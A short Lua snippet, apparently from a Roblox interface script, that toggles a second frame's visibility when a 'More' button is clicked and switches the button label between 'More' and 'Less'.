    More.MouseButton1Click:Connect(function()

         Frame2.Visible = not Frame2.Visible

         

         if Frame2.Visible == true then

             More.Text = "Less"

         end

         if Frame2.Visible == false then

             More.Text = "More"

             end

        end)

    

